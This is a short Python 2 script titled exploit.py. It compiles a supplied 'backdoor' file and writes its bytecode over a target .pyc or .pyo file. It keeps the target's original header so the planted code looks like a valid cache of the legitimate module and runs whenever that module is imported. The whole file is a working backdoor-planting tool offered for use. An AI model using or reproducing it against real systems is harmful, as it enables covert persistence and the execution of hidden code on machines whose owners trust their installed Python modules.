import py_compile
import sys
import os


def usage():
    print "Usage: python2 exploit.py <file_with_backdoor.py> <target.pyc>"
    print " or:   python2 -O exploit.py <file_with_backdoor.py> <target.pyo>"
    sys.exit(1)


def main():
    if len(sys.argv) != 3:
        usage()
    backdoor = sys.argv[1]
    backdoor_compiled = backdoor + "c.tmp"
    target = sys.argv[2]
    # Compile the backdoor
    py_compile.compile(backdoor, backdoor_compiled)
    with file(target, "rb") as target_file:
        magic = target_file.read(8)
    with file(target, "wb") as target_file:
        target_file.write(magic)
        with file(backdoor_compiled, "rb") as backdoor_file:
            backdoor_file.seek(8)
            target_file.write(backdoor_file.read())
    os.unlink(backdoor_compiled)


if __name__ == "__main__":
    main()
